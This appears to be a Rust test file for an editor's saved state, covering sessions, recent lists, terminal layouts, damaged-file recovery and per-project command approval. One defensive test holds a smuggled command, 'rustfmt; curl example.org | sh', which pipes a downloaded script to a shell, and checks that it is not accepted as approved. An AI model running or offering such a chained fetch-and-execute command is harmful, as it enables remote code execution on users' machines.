//! [`State`] 的测试：多进程读改写、容错读入、徽章颜色、现场与工具选择的记录。

use super::*;

#[test]
fn several_windows_keep_each_others_changes() {
    let dir = std::env::temp_dir().join(format!("winc-state-merge-{}", std::process::id()));
    let path = dir.join("state.json");
    let (x, y) = (Path::new("/p/x"), Path::new("/p/y"));

    // 模拟两个进程先后读改写同一个文件：第一个记下 X 的现场与书签，第二个打开 Y。
    let (_, ok) = State::update(&path, &State::default(), |s| s.remember(x));
    ok.unwrap();
    let (_, ok) = State::update(&path, &State::default(), |s| {
        s.set_session(Session {
            folder: x.to_path_buf(),
            bookmarks: vec![(x.join("a.rs"), vec![3])],
            ..Session::default()
        });
    });
    ok.unwrap();
    let (_, ok) = State::update(&path, &State::default(), |s| {
        s.remember(y);
        s.last = Some(y.to_path_buf());
    });
    ok.unwrap();

    // 每次写入前重新读取，因此两次修改都保留在文件中。
    let state = State::load_from(&path);
    assert_eq!(state.recent, [y, x]);
    assert_eq!(state.session_for(x).unwrap().bookmarks.len(), 1);
    assert_eq!(state.last.as_deref(), Some(y));
    let _ = std::fs::remove_dir_all(&dir);
}

/// 状态文件读不出来时不写回空状态；内容损坏时留一份副本，在内存中的状态上重建。
#[test]
fn an_unreadable_or_damaged_file_is_not_overwritten_with_an_empty_state() {
    let dir = std::env::temp_dir().join(format!("winc-state-damaged-{}", std::process::id()));
    let path = dir.join("state.json");
    let (x, y) = (Path::new("/p/x"), Path::new("/p/y"));
    let mut current = State::default();
    current.remember(x);

    // 路径上是一个目录：读取失败（不是「不存在」），不写回，返回在内存状态上修改的结果。
    std::fs::create_dir_all(&path).unwrap();
    assert!(State::read(&path).is_err());
    let (state, result) = State::update(&path, &current, |s| s.remember(y));
    assert!(result.is_err());
    assert_eq!(state.recent, [y, x]);
    assert!(path.is_dir());
    std::fs::remove_dir(&path).unwrap();

    // 没有文件、空文件：从空状态开始。
    assert_eq!(State::read(&path).unwrap(), None);
    std::fs::write(&path, "\n").unwrap();
    assert_eq!(State::read(&path).unwrap(), None);

    // 内容损坏：原文件留作副本，写入的是内存中的状态加上这次修改。
    std::fs::write(&path, "{\"recent\": [\"/p/old\"").unwrap();
    let invalid = State::read(&path).unwrap_err();
    assert_eq!(invalid.kind(), std::io::ErrorKind::InvalidData);
    let (state, result) = State::update(&path, &current, |s| s.remember(y));
    result.unwrap();
    assert_eq!(state.recent, [y, x]);
    assert_eq!(State::read(&path).unwrap().unwrap().recent, [y, x]);
    let kept = std::fs::read_to_string(path.with_extension("damaged")).unwrap();
    assert!(kept.contains("/p/old"));
    let _ = std::fs::remove_dir_all(&dir);
}

fn sample() -> State {
    let mut state = State {
        recent: vec![PathBuf::from("/a/项目"), PathBuf::from("/b")],
        recent_files: vec![
            PathBuf::from("/a/项目/main.rs"),
            PathBuf::from("/c/笔记.md"),
        ],
        places: vec![(
            PathBuf::from("/a/项目/手册.pdf"),
            FilePlace {
                text: Some((40, 2, 31)),
                view: Some((12, 0.375)),
            },
        )],
        sessions: vec![
            Session {
                folder: PathBuf::from("/a/项目"),
                tabs: vec![
                    Tab::File(PathBuf::from("/a/项目/main.rs")),
                    Tab::Untitled("untitled-1f".into()),
                    Tab::File(PathBuf::from("/a/项目/lib.rs")),
                ],
                active: Some(2),
                bookmarks: vec![(PathBuf::from("/a/项目/main.rs"), vec![0, 41])],
                outline: vec![(
                    PathBuf::from("/a/项目/README.md"),
                    vec!["安装".into(), "用法\u{1f}配置".into()],
                )],
                folds: vec![(PathBuf::from("/a/项目/README.md"), vec![(0, 12), (3, 7)])],
                terminal: Some(TerminalSession {
                    tabs: vec![PathBuf::from("/a/项目"), PathBuf::from("/a/项目/src")],
                    names: vec![String::new(), "服务".into()],
                    shells: vec![String::new(), "/bin/bash".into()],
                    active: 1,
                    open: true,
                    height: 320.0,
                    width: 0.0,
                    maximized: true,
                    groups: vec![
                        TerminalGroup {
                            tabs: 1,
                            share: 1.0,
                            editor: None,
                        },
                        TerminalGroup {
                            tabs: 1,
                            share: 0.5,
                            editor: None,
                        },
                    ],
                }),
                run: Some("后端".into()),
                folders: vec![PathBuf::from("/tmp/extra"), PathBuf::from("/tmp/另一个")],
                name: Some("后端组".into()),
                project: Some(PathBuf::from("/a/team.winc-project")),
                readonly: vec![PathBuf::from("/a/项目/main.rs")],
                readonly_all: true,
                sidebar_hidden: true,
                window: Some(WindowFrame {
                    position: Some((0.0, 25.0)),
                    width: 1440.0,
                    height: 875.0,
                    scale: 2.0,
                    maximized: true,
                }),
                panes: Some(SessionPanes {
                    tree: PaneNode::Split {
                        column: false,
                        share: 0.25,
                        first: Box::new(PaneNode::Pane(0)),
                        second: Box::new(PaneNode::Pane(1)),
                    },
                    panes: vec![
                        SessionPane {
                            tabs: vec![0],
                            active: Some(0),
                        },
                        SessionPane {
                            tabs: vec![1, 0],
                            active: None,
                        },
                    ],
                    focused: 1,
                }),
                repositories: SessionRepositories::default(),
            },
            Session {
                folder: PathBuf::from("/b"),
                tabs: vec![Tab::File(PathBuf::from("/b/x"))],
                active: None,
                bookmarks: Vec::new(),
                outline: Vec::new(),
                folds: Vec::new(),
                terminal: None,
                run: None,
                folders: Vec::new(),
                name: None,
                project: None,
                readonly: Vec::new(),
                readonly_all: false,
                sidebar_hidden: false,
                window: None,
                panes: None,
                repositories: SessionRepositories {
                    added: vec![PathBuf::from("/a/项目/vendor/lib")],
                    removed: vec![PathBuf::from("/a/项目/old")],
                },
            },
        ],
        last: Some(PathBuf::from("/a/项目")),
        others: vec![PathBuf::from("/b")],
        commit_tree: true,
        commit_sort: "status".into(),
        commit_all_repositories: Some(true),
        log_branches: Some(false),
        log_files_tree: Some(false),
        diff_files_tree: Some(true),
        search_tree: true,
        log_columns: Some(vec!["date".into(), "hash".into()]),
        commit_messages: vec!["修复登录\n\n说明".into(), "first".into()],
        commit_check_todo: true,
        commit_reformat: true,
        sign_off_repos: vec![PathBuf::from("/a/项目")],
        pdf_thumbnails_hidden: true,
        markdown_toc_pinned: true,
        recent_languages: vec!["markdown".to_owned(), "json".to_owned()],
        vim_marks: vec![('A', PathBuf::from("/a/项目/x.rs"), 12, 3)],
        vim_commands: vec!["%s/a/b/g".into(), "w".into()],
        vim_searches: vec!["\\<词\\>".into()],
        vim_keys_noticed: true,
        stay_outside_applications: true,
        panel_width: Some(360.0),
        preview_modes: [
            ("markdown".into(), "preview".into()),
            ("svg".into(), "split".into()),
        ]
        .into(),
        version: Some("0.1.626".into()),
        setup_pending: true,
        window: Some(WindowFrame {
            position: Some((-1280.0, 40.0)),
            width: 900.5,
            height: 600.0,
            scale: 2.0,
            maximized: true,
        }),
        badges: Vec::new(),
        tool_choices: vec![(PathBuf::from("/a/项目"), true)],
        approved_commands: vec![(PathBuf::from("/a/项目/.winc"), "rustfmt \"$FILE\"".into())],
        trusted_repos: vec![(PathBuf::from("/a/项目"), u64::MAX - 1)],
        remote_keys: Vec::new(),
    };
    state.set_remote_key("me@devbox:2200", "~/.ssh/工作 key");
    state.set_remote_key("build", "/keys/build");
    state.assign_badges();
    state
}

#[test]
fn a_key_file_is_kept_per_remote_host_until_cleared() {
    let mut state = sample();
    assert_eq!(state.remote_key("build"), Some("/keys/build"));
    assert_eq!(state.remote_key("me@devbox"), None);
    state.set_remote_key("build", "/keys/other");
    assert_eq!(state.remote_key("build"), Some("/keys/other"));
    state.set_remote_key("build", "");
    assert_eq!(state.remote_key("build"), None);
    assert_eq!(state.remote_key("me@devbox:2200"), Some("~/.ssh/工作 key"));
}

#[test]
fn round_trips_through_json() {
    let state = sample();
    assert_eq!(State::parse(&state.to_json()), state);
    assert_eq!(State::parse(&State::default().to_json()), State::default());
}

#[test]
fn a_single_editor_terminal_round_trips_with_a_closed_panel() {
    let mut state = State::default();
    state.set_session(Session {
        folder: PathBuf::from("/terminal-only"),
        terminal: Some(TerminalSession {
            tabs: vec![PathBuf::from("/terminal-only")],
            names: vec!["server".into()],
            shells: vec!["/bin/sh".into()],
            groups: vec![TerminalGroup {
                tabs: 1,
                share: 0.75,
                editor: Some(TerminalEditor {
                    pane: 0,
                    tab: 0,
                    active: true,
                }),
            }],
            ..TerminalSession::default()
        }),
        ..Session::default()
    });
    let json = state.to_json();
    assert!(json.contains("\"editor\""));
    let restored = State::parse(&json);
    assert_eq!(restored, state);
    let session = restored.session_for(Path::new("/terminal-only")).unwrap();
    assert!(session.tabs.is_empty());
    assert!(!session.terminal.as_ref().unwrap().open);
}

#[test]
fn mixed_terminal_order_and_terminal_only_panes_round_trip() {
    let placement = |pane, tab, active| Some(TerminalEditor { pane, tab, active });
    let mut state = State::default();
    state.set_session(Session {
        folder: PathBuf::from("/mixed"),
        tabs: vec![
            Tab::File(PathBuf::from("/mixed/a.rs")),
            Tab::File(PathBuf::from("/mixed/b.rs")),
        ],
        panes: Some(SessionPanes {
            tree: PaneNode::Split {
                column: true,
                share: 0.4,
                first: Box::new(PaneNode::Pane(0)),
                second: Box::new(PaneNode::Pane(1)),
            },
            panes: vec![
                SessionPane {
                    tabs: vec![0, 1],
                    active: None,
                },
                SessionPane {
                    tabs: Vec::new(),
                    active: None,
                },
            ],
            focused: 1,
        }),
        terminal: Some(TerminalSession {
            tabs: vec![PathBuf::from("/mixed"); 5],
            groups: vec![
                TerminalGroup {
                    tabs: 1,
                    share: 1.0,
                    editor: placement(0, 3, false),
                },
                TerminalGroup {
                    tabs: 2,
                    share: 0.5,
                    editor: placement(1, 0, true),
                },
                TerminalGroup {
                    tabs: 1,
                    share: 0.75,
                    editor: placement(0, 1, true),
                },
                TerminalGroup {
                    tabs: 1,
                    share: 1.25,
                    editor: placement(0, 2, false),
                },
            ],
            ..TerminalSession::default()
        }),
        ..Session::default()
    });
    assert_eq!(State::parse(&state.to_json()), state);
}

#[test]
fn editor_placement_is_optional_and_bad_placement_keeps_the_shells() {
    let parse = |placement: &str| {
        let text = format!(
            r#"{{"session":{{"folder":"/p","files":[],"terminal":{{
            "tabs":["/p","/p/src"],"names":["one","two"],"shells":["/bin/sh","/bin/bash"],
            "groups":[{{"tabs":1,"share":0.5,"editor":{placement}}},{{"tabs":1,"share":1}}]
        }}}}}}"#
        );
        State::parse(&text)
            .session_for(Path::new("/p"))
            .unwrap()
            .terminal
            .clone()
            .unwrap()
    };
    let expected = TerminalEditor {
        pane: 1,
        tab: 2,
        active: false,
    };
    assert_eq!(
        parse(r#"{"pane":1,"tab":2}"#).groups[0].editor,
        Some(expected)
    );
    for bad in [
        r#"{"pane":-1,"tab":0}"#,
        r#"{"pane":1.5,"tab":0}"#,
        r#"{"pane":0,"tab":-1}"#,
        r#"{"pane":0,"tab":0.5}"#,
        r#"{"pane":1e100,"tab":0}"#,
        r#"{"pane":0}"#,
        r#"{"pane":0,"tab":0,"active":"yes"}"#,
        "null",
    ] {
        let terminal = parse(bad);
        assert_eq!(
            terminal.tabs,
            [PathBuf::from("/p"), PathBuf::from("/p/src")]
        );
        assert_eq!(terminal.names, ["one", "two"]);
        assert_eq!(terminal.shells, ["/bin/sh", "/bin/bash"]);
        assert_eq!(terminal.groups.len(), 2);
        assert_eq!(terminal.groups[0].editor, None, "{bad}");
    }
}

#[test]
fn legacy_terminal_groups_keep_their_original_json_shape() {
    let groups = [
        TerminalGroup {
            tabs: 1,
            share: 1.0,
            editor: None,
        },
        TerminalGroup {
            tabs: 2,
            share: 0.5,
            editor: None,
        },
    ];
    let json = Json::parse(r#"[{"tabs":1,"share":1},{"tabs":2,"share":0.5}]"#).unwrap();
    assert_eq!(terminal_groups_json(&groups), Some(json.clone()));
    assert_eq!(terminal_groups_json(&groups[..1]), None);
    let object = Json::object(vec![("groups", json)]);
    assert_eq!(read_terminal_groups(object.as_object().unwrap(), 3), groups);
    assert!(read_terminal_groups(object.as_object().unwrap(), 4).is_empty());
    let singleton = Json::object(vec![(
        "groups",
        Json::Array(vec![Json::object(vec![
            ("tabs", Json::Number(1.0)),
            ("share", Json::Number(1.0)),
        ])]),
    )]);
    assert!(read_terminal_groups(singleton.as_object().unwrap(), 1).is_empty());
}

#[test]
fn preview_modes_are_read_per_kind() {
    let modes = |text: &str| {
        State::parse(text)
            .preview_modes
            .into_iter()
            .collect::<Vec<_>>()
    };
    let pair = |kind: &str, mode: &str| (kind.to_owned(), mode.to_owned());
    // 字符串用于全部种类。
    assert_eq!(
        modes(r#"{"previewMode": "split"}"#),
        [
            pair("markdown", "split"),
            pair("svg", "split"),
            pair("table", "split")
        ]
    );
    // 未知的种类和方式跳过。
    let text = r#"{"previewMode": {"markdown": "preview", "svg": "x", "pdf": "split"}}"#;
    assert_eq!(modes(text), [pair("markdown", "preview")]);
    assert!(modes(r#"{"previewMode": "source"}"#).is_empty());
}

#[test]
fn places_are_kept_most_recent_first_and_capped() {
    let mut state = State::default();
    let file = |i: usize| PathBuf::from(format!("/a/{i}.rs"));
    for i in 0..MAX_PLACES + 5 {
        state.set_place(&file(i), |place| place.text = Some((i, 0, i)));
    }
    // 超出上限时丢掉最久没有用到的；再次用到的移到最前，其余部分保留。
    assert_eq!(state.places.len(), MAX_PLACES);
    assert_eq!(state.places[0].0, file(MAX_PLACES + 4));
    assert_eq!(state.place_of(&file(4)), None);
    state.set_place(&file(5), |place| place.view = Some((3, 0.25)));
    assert_eq!(state.places[0].0, file(5));
    let both = FilePlace {
        text: Some((5, 0, 5)),
        view: Some((3, 0.25)),
    };
    assert_eq!(state.place_of(&file(5)), Some(both));
    // 什么都不剩的记录去掉。
    state.set_place(&file(5), |place| *place = FilePlace::default());
    assert_eq!(state.place_of(&file(5)), None);
    assert_eq!(state.places.len(), MAX_PLACES - 1);

    // 改名：文件和目录下的各文件都改记在新路径上。
    state.move_places(&file(10), Path::new("/a/ten.rs"));
    state.move_places(Path::new("/a"), Path::new("/b"));
    assert!(state.place_of(Path::new("/b/ten.rs")).is_some());
    assert!(state.places.iter().all(|(path, _)| path.starts_with("/b")));

    // 写出再读入不变。
    assert_eq!(State::parse(&state.to_json()).places, state.places);
}

#[test]
fn malformed_and_earlier_places_are_read() {
    // 读不出的部分当作没有，什么都没有的记录和重复的路径跳过。
    let text = r#"{"places": [
        {"path": "/a/a.rs", "caret": [12, 4], "top": 3},
        {"path": "/a/b.pdf", "view": [2, 0.5], "caret": [1]},
        {"path": "/a/c.rs", "caret": [-1, 0]}, {"path": "/a/a.rs", "caret": [1, 1]},
        {"path": "", "caret": [1, 1]}, {"caret": [1, 1]}, 7]}"#;
    let text_at = |place| FilePlace {
        text: Some(place),
        view: None,
    };
    let view_at = |place| FilePlace {
        text: None,
        view: Some(place),
    };
    let places = [
        (PathBuf::from("/a/a.rs"), text_at((12, 4, 3))),
        (PathBuf::from("/a/b.pdf"), view_at((2, 0.5))),
    ];
    assert_eq!(State::parse(text).places, places);

    // 早先记在各目录现场里的阅读位置并入，已有记录的文件以新的为准；页号为负数或小数、比例
    // 不是数字、缺少一项的跳过。
    let text = r#"{"places": [{"path": "/a/a.pdf", "view": [9, 0.25]}],
        "session": {"folder": "/a", "files": [], "pdfPlaces":
        {"/a/a.pdf": [2, 0.5], "/a/b.pdf": [-1, 0], "/a/c.pdf": [1.5, 0], "/a/d.pdf": [3],
         "/a/e.pdf": [0, "x"], "/a/f.pdf": 4, "": [1, 0], "/a/g.pdf": [4, 0.5]},
        "bookPlaces": {"/a/h.epub": [340, 0.5]}}}"#;
    let places = [
        (PathBuf::from("/a/a.pdf"), view_at((9, 0.25))),
        (PathBuf::from("/a/g.pdf"), view_at((4, 0.5))),
        (PathBuf::from("/a/h.epub"), view_at((340, 0.5))),
    ];
    let state = State::parse(text);
    assert_eq!(state.places, places);
    // 写出时不再写在现场里。
    assert!(!state.to_json().contains("pdfPlaces"));
}

#[test]
fn bad_input_means_no_history() {
    for text in [
        "",
        "{",
        "[1, 2]",
        "{\"recent\": 3}",
        "{\"session\": {\"files\": []}}",
        "{\"sessions\": [3, {\"files\": []}]}",
    ] {
        let state = State::parse(text);
        assert!(
            state.recent.is_empty() && state.sessions.is_empty(),
            "{text}"
        );
        assert!(state.last_session().is_none(), "{text}");
    }

    // 无法解析的标签被跳过，其余仍然读取。
    let text = r#"{"session": {"folder": "/a", "files": [3, {"untitled": ""}, {"x": 1}, "", {"untitled": "u"}, "/a/x"]}}"#;
    assert_eq!(
        State::parse(text).last_session().unwrap().tabs,
        [Tab::Untitled("u".into()), Tab::File(PathBuf::from("/a/x"))]
    );

    // 活动标签的下标越界、是小数或负数时忽略，其余仍然读取。
    for active in ["5", "0.5", "-1"] {
        let text = format!(
            "{{\"session\": {{\"folder\": \"/a\", \"files\": [\"/a/x\"], \"active\": {active}}}}}"
        );
        let state = State::parse(&text);
        let session = state.last_session().unwrap();
        assert_eq!(session.tabs.len(), 1);
        assert_eq!(session.active, None, "{active}");
    }
}

#[test]
fn recent_list_moves_to_front_and_is_capped() {
    let mut state = State::default();
    for i in 0..MAX_RECENT + 5 {
        state.remember(Path::new(&format!("/p{i}")));
    }
    assert_eq!(state.recent.len(), MAX_RECENT);
    assert_eq!(
        state.recent[0],
        PathBuf::from(format!("/p{}", MAX_RECENT + 4))
    );

    state.remember(Path::new("/p10"));
    assert_eq!(state.recent[0], PathBuf::from("/p10"));
    assert_eq!(
        state
            .recent
            .iter()
            .filter(|p| **p == Path::new("/p10"))
            .count(),
        1
    );

    let mut state = sample();
    state.forget(Path::new("/a/项目"));
    assert_eq!(state.recent, vec![PathBuf::from("/b")]);
    assert!(
        state.last_session().is_none() && state.session_for(Path::new("/a/项目")).is_none(),
        "拿掉的目录正好是上次的现场，现场也作废"
    );
    assert!(state.session_for(Path::new("/b")).is_some());
}

#[test]
fn recent_files_move_to_front_and_are_capped() {
    let mut state = State::default();
    for i in 0..MAX_RECENT_FILES + 5 {
        state.remember_file(Path::new(&format!("/f{i}.rs")));
    }
    state.remember_file(Path::new("/f10.rs"));
    assert_eq!(state.recent_files.len(), MAX_RECENT_FILES);
    assert_eq!(state.recent_files[0], Path::new("/f10.rs"));
    assert_eq!(
        state
            .recent_files
            .iter()
            .filter(|p| p.ends_with("f10.rs"))
            .count(),
        1
    );
    state.forget_file(Path::new("/f10.rs"));
    assert!(!state.recent_files.iter().any(|p| p.ends_with("f10.rs")));
}

#[test]
fn recent_folders_keep_their_own_badge_colors() {
    let mut state = State::default();
    for i in 0..BADGE_COLORS {
        state.remember(Path::new(&format!("/projects/p{i}")));
    }

    // 最近列表中各目录的颜色互不相同。
    let colors = |state: &State| -> Vec<usize> {
        state.recent.iter().map(|p| state.badge_color(p)).collect()
    };
    let mut all = colors(&state);
    all.sort_unstable();
    all.dedup();
    assert_eq!(all.len(), BADGE_COLORS);

    // 重新打开已有目录：移到最前面，该目录与其他目录的颜色都不变。
    let before = state.badge_color(Path::new("/projects/p3"));
    let others: Vec<_> = state
        .recent
        .iter()
        .map(|p| (p.clone(), state.badge_color(p)))
        .collect();
    state.remember(Path::new("/projects/p3"));
    assert_eq!(state.badge_color(Path::new("/projects/p3")), before);
    for (folder, color) in others {
        assert_eq!(state.badge_color(&folder), color);
    }

    // 新目录把第十个目录挤出前十并获得它让出的颜色；该目录仍在列表中，按名字取色。序列化
    // 后再读回，颜色保持不变。
    let oldest = state.recent.last().cloned().unwrap();
    let freed = state.badge_color(&oldest);
    state.remember(Path::new("/projects/new"));
    assert_eq!(state.badge_color(Path::new("/projects/new")), freed);
    assert_eq!(state.recent.get(BADGE_COLORS), Some(&oldest));
    assert_eq!(state.badge_color(&oldest), preferred_color(&oldest));
    assert_eq!(colors(&State::parse(&state.to_json())), colors(&state));

    // 旧文件缺少颜色、手工改成重复或越界时，读入后颜色被理顺为互不相同。
    let old =
        r#"{"recent": ["/x/a", "/x/b", "/x/c"], "badges": {"/x/a": 4, "/x/b": 4, "/x/c": 99}}"#;
    let state = State::parse(old);
    assert_eq!(state.badge_color(Path::new("/x/a")), 4);
    let mut parsed = colors(&state);
    parsed.sort_unstable();
    parsed.dedup();
    assert_eq!(parsed.len(), 3);
}

#[test]
fn sessions_are_kept_per_folder() {
    let mut state = sample();
    assert_eq!(state.last_session().unwrap().tabs.len(), 3);

    // 记录 `/b` 的现场：移到最前面，同目录的旧记录被替换，不重复。
    state.set_session(Session {
        folder: PathBuf::from("/b"),
        tabs: vec![],
        active: None,
        bookmarks: Vec::new(),
        outline: Vec::new(),
        folds: Vec::new(),
        terminal: None,
        run: None,
        folders: Vec::new(),
        name: None,
        project: None,
        readonly: Vec::new(),
        readonly_all: false,
        sidebar_hidden: false,
        window: None,
        panes: None,
        repositories: SessionRepositories::default(),
    });
    assert_eq!(state.sessions.len(), 2);
    assert_eq!(state.sessions[0].folder, PathBuf::from("/b"));
    assert!(state.session_for(Path::new("/b")).unwrap().tabs.is_empty());

    for i in 0..20 {
        state.set_session(Session {
            folder: PathBuf::from(format!("/p{i}")),
            ..Session::default()
        });
    }
    assert_eq!(state.sessions.len(), MAX_SESSIONS);

    // 旧格式只记单个 `session`，读入后作为上次退出时的现场。
    let old = "{\"recent\": [\"/a\"], \"session\": {\"folder\": \"/a\", \"files\": [\"/a/x\"]}}";
    let state = State::parse(old);
    assert_eq!(state.last.as_deref(), Some(Path::new("/a")));
    assert_eq!(
        state.last_session().unwrap().tabs,
        [Tab::File(PathBuf::from("/a/x"))]
    );
}

#[test]
fn an_approved_command_is_matched_by_its_text() {
    let mut state = State::default();
    let folder = Path::new("/a/.winc");
    assert!(!state.command_approved(folder, "rustfmt"));
    state.approve_command(folder, "rustfmt");
    state.approve_command(folder, "rustfmt");
    assert_eq!(state.approved_commands.len(), 1);
    assert!(state.command_approved(folder, "rustfmt"));
    // 项目设置改写了命令，或另一个项目写了同样的命令：都没有同意过。
    assert!(!state.command_approved(folder, "rustfmt; curl example.org | sh"));
    assert!(!state.command_approved(Path::new("/b/.winc"), "rustfmt"));
    assert_eq!(State::parse(&state.to_json()), state);

    for i in 0..MAX_TOOL_CHOICES + 5 {
        state.approve_command(folder, &format!("tool{i}"));
    }
    assert_eq!(state.approved_commands.len(), MAX_TOOL_CHOICES);
    assert!(!state.command_approved(folder, "rustfmt"), "最早的挤掉了");
}

#[test]
fn tool_choices_are_remembered_per_folder() {
    let mut state = State::default();
    assert_eq!(state.tool_choice(Path::new("/a")), None);
    state.set_tool_choice(Path::new("/a"), true);
    state.set_tool_choice(Path::new("/b"), false);
    state.set_tool_choice(Path::new("/a"), false);
    assert_eq!(state.tool_choice(Path::new("/a")), Some(false));
    assert_eq!(state.tool_choice(Path::new("/b")), Some(false));
    assert_eq!(State::parse(&state.to_json()), state);

    for i in 0..MAX_TOOL_CHOICES + 5 {
        state.set_tool_choice(Path::new(&format!("/p{i}")), true);
    }
    assert_eq!(state.tool_choices.len(), MAX_TOOL_CHOICES);
    assert_eq!(state.tool_choice(Path::new("/a")), None, "最早的挤掉了");
}

#[test]
fn save_to_writes_a_temp_file_then_renames() {
    let dir = std::env::temp_dir().join(format!("winc-state-test-{}", std::process::id()));
    let path = dir.join("nested").join("state.json");
    let _ = std::fs::remove_dir_all(&dir);

    sample().save_to(&path).unwrap();
    assert_eq!(State::load_from(&path), sample());
    assert!(!path.with_extension("json.tmp").exists());
    assert_eq!(
        State::load_from(&dir.join("missing.json")),
        State::default()
    );

    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn state_path_is_separate_from_config() {
    let path = state_path().unwrap();
    assert!(path.ends_with("winc/state.json"), "{}", path.display());
    assert_ne!(Some(path), crate::config_path());
}

#[test]
fn window_frames_need_a_usable_size_and_may_have_no_position() {
    let read = |text: &str| State::parse(text).window;
    let frame = read(r#"{"window":{"width":800,"height":600,"scale":1}}"#).unwrap();
    assert_eq!(frame.position, None);
    assert!(!frame.maximized);
    assert_eq!(
        read(r#"{"window":{"width":0,"height":600,"scale":1}}"#),
        None
    );
    assert_eq!(read(r#"{"window":{"width":800,"height":600}}"#), None);
    assert_eq!(read(r#"{"window":"nothing"}"#), None);
}

/// 提交过的信息：相同的移到最前，最多留 `MAX_COMMIT_MESSAGES` 条。
#[test]
fn commit_messages_keep_the_newest_without_repeats() {
    let mut state = State::default();
    for i in 0..MAX_COMMIT_MESSAGES + 5 {
        state.remember_commit_message(&format!("m{i}"));
    }
    state.remember_commit_message("m10");
    state.remember_commit_message("");
    assert_eq!(state.commit_messages.len(), MAX_COMMIT_MESSAGES);
    assert_eq!(state.commit_messages[0], "m10");
    assert_eq!(
        state.commit_messages.iter().filter(|m| *m == "m10").count(),
        1
    );
}
